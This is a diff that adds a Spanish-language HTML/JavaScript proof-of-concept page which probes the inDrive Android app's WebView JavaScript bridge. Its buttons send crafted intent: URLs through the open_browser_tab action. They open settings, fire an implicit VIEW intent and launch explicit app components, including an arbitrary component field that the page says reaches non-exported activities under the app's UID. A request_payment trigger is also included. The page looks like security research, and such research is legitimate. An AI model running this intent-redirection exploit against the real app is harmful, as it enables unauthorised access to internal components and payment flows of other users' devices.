@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>inDrive bridge - fase 2 (intents)</title>
+<style>
+  :root { color-scheme: dark; }
+  * { box-sizing: border-box; }
+  body { margin:0; padding:14px 14px 40px; font-family: ui-monospace, Menlo, Consolas, monospace; background:#0b0f14; color:#d7e2ea; }
+  h1 { font-size:17px; margin:0 0 6px; color:#fff; }
+  h2 { font-size:13px; text-transform:uppercase; letter-spacing:.08em; color:#7fb3d5; margin:22px 0 8px; }
+  p, li { font-size:12.5px; line-height:1.45; color:#9fb0bd; }
+  code { color:#ffd479; word-break:break-all; }
+  .badge { display:inline-block; padding:3px 8px; border-radius:999px; font-size:11px; font-weight:700; }
+  .ok { background:#123d24; color:#5ee08a; }
+  .bad { background:#3d1212; color:#ff7b7b; }
+  .warn { background:#3d2f12; color:#ffc857; }
+  .card { background:#111821; border:1px solid #1e2a36; border-radius:10px; padding:12px; margin:10px 0; }
+  button { width:100%; padding:13px 12px; margin:6px 0; font-size:14px; font-weight:600; border-radius:9px; border:1px solid #2a3a4a; background:#17222d; color:#e8eef3; }
+  button:active { transform:translateY(1px); }
+  button.safe { border-color:#1f5a37; background:#102a1c; color:#8ff0b0; }
+  button.sens { border-color:#6b4b12; background:#2a2010; color:#ffd479; }
+  button.danger { border-color:#6b1f1f; background:#2a1010; color:#ff9a9a; }
+  #log { background:#05080b; border:1px solid #1e2a36; border-radius:10px; padding:10px; margin-top:10px; min-height:180px; white-space:pre-wrap; word-break:break-all; font-size:11.5px; line-height:1.4; }
+  .muted { color:#6b7c8a; font-size:11.5px; }
+  .row { display:flex; gap:8px; }
+  .row > * { flex:1; }
+  details { margin:8px 0; }
+  summary { cursor:pointer; font-size:12px; color:#7fb3d5; }
+  a { color:#7fb3d5; }
+</style>
+</head>
+<body>
+
+<h1>inDrive WebView bridge &mdash; fase 2</h1>
+<p>Banco de pruebas para resolver <strong>por qu&eacute; <code>open_browser_tab</code> no produjo efecto visible</strong> y para validar la redirecci&oacute;n de intents en 5.166.1. Cada prueba es independiente: si una no hace nada, pulsa la siguiente.</p>
+
+<div class="card">
+  <div>Bridge: <span id="stBridge" class="badge bad">no</span></div>
+  <div style="margin-top:6px">URL: <code id="stUrl"></code></div>
+  <div style="margin-top:6px">App: <code id="stApp">-</code> &middot; Android: <code id="stOs">-</code></div>
+</div>
+
+<h2>0. Diagn&oacute;stico</h2>
+<button class="safe" onclick="probe()">Reiniciar diagn&oacute;stico</button>
+
+<h2>1. &iquest;Existe el handler? URL https plana</h2>
+<p class="muted">Si el handler funciona, debe abrirse el navegador en example.com. Si no pasa nada, el problema es el despacho de la acci&oacute;n, no el parseo del intent.</p>
+<button class="safe" onclick="openHttps()">open_browser_tab &rarr; https://example.com</button>
+
+<h2>2. Intent can&oacute;nico (forma correcta <code>intent:#Intent;...;end</code>)</h2>
+<button class="safe" onclick="openSettingsCanonical()">Abrir Ajustes de Android</button>
+<button class="safe" onclick="openAppDetailsCanonical()">Abrir detalles de la app inDrive</button>
+<button class="sens" onclick="openViewImplicit()">intent VIEW impl&iacute;cito &rarr; https://example.com</button>
+
+<h2>3. Componente expl&iacute;cito del propio inDrive</h2>
+<p class="muted">WebViewUrlActivity es exported=true y acepta <code>url</code> como String extra. El intent se lanza con el UID de inDrive, as&iacute; que tambi&eacute;n alcanza componentes no exportados.</p>
+<button class="sens" onclick="openWebViewUrlActivity()">WebViewUrlActivity con url=https://example.com</button>
+<details>
+  <summary>Componente personalizado</summary>
+  <input id="component" value="sinet.startup.inDriver/.ui.web_view.WebViewUrlActivity" spellcheck="false" style="width:100%;padding:11px;margin:6px 0;border-radius:8px;border:1px solid #2a3a4a;background:#0e151c;color:#e8eef3;font-family:inherit;font-size:13px">
+  <button class="sens" onclick="openComponent()">Lanzar componente</button>
+</details>
+
+<h2>4. Ruta shouldOverrideUrlLoading</h2>
+<p class="muted">Navegaci&oacute;n directa a un intent desde JS. Sirve para comparar con la ruta del bridge.</p>
+<button class="safe" onclick="navigateIntent()">location.href = intent (Ajustes)</button>
+<button class="safe" onclick="navigateCustomScheme()">location.href = indrive://open?...</button>
+
+<h2>5. Acciones nuevas de 5.166.1 (sin payload sensible)</h2>
+<button class="safe" onclick="openAppSettingsAction()">open_app_settings</button>
+<button class="safe" onclick="playHaptic()">play_haptic</button>
+<button class="safe" onclick="reloadPage()">reload_page</button>
+<button class="safe" onclick="testToast()">toast (control positivo)</button>
+
+<h2>6. Pago (solo con un paymentId propio)</h2>
+<input id="paymentId" placeholder="paymentId propio (no usar ajenos)" spellcheck="false" style="width:100%;padding:11px;margin:6px 0;border-radius:8px;border:1px solid #2a3a4a;background:#0e151c;color:#e8eef3;font-family:inherit;font-size:13px">
+<button class="danger" onclick="requestPayment()">request_payment</button>
+
+<h2>Log</h2>
+<div id="log">Esperando...</div>
+<div class="row" style="margin-top:8px">
+  <button class="safe" onclick="copyLog()">Copiar log</button>
+  <button class="safe" onclick="clearLog()">Limpiar</button>
+</div>
+
+<script>
+var LOG = [];
+var bridge = null;
+
+function now() {
+  var d = new Date();
+  return d.toISOString().slice(11, 23);
+}
+function log(msg) {
+  LOG.push("[" + now() + "] " + msg);
+  var el = document.getElementById("log");
+  el.textContent = LOG.join("\n");
+  el.scrollTop = el.scrollHeight;
+}
+function send(action, data, note) {
+  if (!bridge) { log("bridge no disponible; no se envio " + action); return; }
+  var msg = JSON.stringify({ action: action, data: data || {} });
+  log("TX " + (note || action) + " :: " + msg);
+  try { bridge.postMessage(msg); }
+  catch (e) { log("postMessage error: " + e.message); }
+}
+
+function probe() {
+  bridge = (window.Android && typeof window.Android.postMessage === "function") ? window.Android : null;
+  var b = document.getElementById("stBridge");
+  b.textContent = bridge ? "presente" : "ausente";
+  b.className = "badge " + (bridge ? "ok" : "bad");
+  document.getElementById("stUrl").textContent = location.href;
+  if (bridge) {
+    var keys = [];
+    for (var k in window.Android) { if (typeof window.Android[k] === "function") keys.push(k); }
+    log("Android: " + keys.join(", "));
+    try { document.getElementById("stApp").textContent = window.Android.getAppVersion(); } catch (e) {}
+    try { document.getElementById("stOs").textContent = window.Android.getOsVersion(); } catch (e) {}
+  } else {
+    log("window.Android no existe: abre esta pagina con el deep link indrive://webdialog?url=...");
+  }
+}
+
+function openHttps() {
+  send("open_browser_tab", { url: "https://example.com/?indrive_poc=open_browser_tab" }, "open_browser_tab https");
+}
+
+function openSettingsCanonical() {
+  send("open_browser_tab", { url: "intent:#Intent;action=android.settings.SETTINGS;end" }, "intent Settings canonico");
+}
+
+function openAppDetailsCanonical() {
+  send("open_browser_tab", { url: "intent:#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;data=package:sinet.startup.inDriver;end" }, "intent AppDetails canonico");
+}
+
+function openViewImplicit() {
+  send("open_browser_tab", { url: "intent:#Intent;action=android.intent.action.VIEW;data=https://example.com/?indrive_poc=implicit;end" }, "intent VIEW implicito");
+}
+
+function openWebViewUrlActivity() {
+  var u = "intent:#Intent;component=sinet.startup.inDriver/sinet.startup.inDriver.ui.web_view.WebViewUrlActivity;S.url=https://example.com/?indrive_poc=component;S.title=PoC;end";
+  send("open_browser_tab", { url: u }, "componente WebViewUrlActivity");
+}
+
+function openComponent() {
+  var c = document.getElementById("component").value.trim();
+  if (!c) return;
+  var u = "intent:#Intent;component=" + c + ";S.url=https://example.com/?indrive_poc=component;S.title=PoC;end";
+  send("open_browser_tab", { url: u }, "componente " + c);
+}
+
+function navigateIntent() {
+  var u = "intent:#Intent;action=android.settings.SETTINGS;end";
+  log("location.href -> " + u);
+  try { location.href = u; } catch (e) { log("nav error: " + e.message); }
+}
+
+function navigateCustomScheme() {
+  var u = "indrive://open?screen=main";
+  log("location.href -> " + u);
+  try { location.href = u; } catch (e) { log("nav error: " + e.message); }
+}
+
+function openAppSettingsAction() {
+  send("open_app_settings", {}, "open_app_settings");
+}
+
+function playHaptic() {
+  send("play_haptic", {}, "play_haptic");
+}
+
+function reloadPage() {
+  send("reload_page", {}, "reload_page");
+}
+
+function testToast() {
+  send("toast", { text: "fase 2 " + now() }, "toast");
+}
+
+function requestPayment() {
+  var id = document.getElementById("paymentId").value.trim();
+  if (!id) { log("falta paymentId"); return; }
+  if (!confirm("Abrir el checkout con este paymentId? Usa solo un id propio.")) return;
+  send("request_payment", { paymentId: id }, "request_payment");
+}
+
+function copyLog() {
+  var txt = LOG.join("\n");
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(txt).then(function () { log("log copiado"); }, function () { log("no se pudo copiar"); });
+  } else { log("clipboard no disponible"); }
+}
+
+function clearLog() {
+  LOG = [];
+  document.getElementById("log").textContent = "Esperando...";
+}
+
+probe();
+</script>
+</body>
+</html>
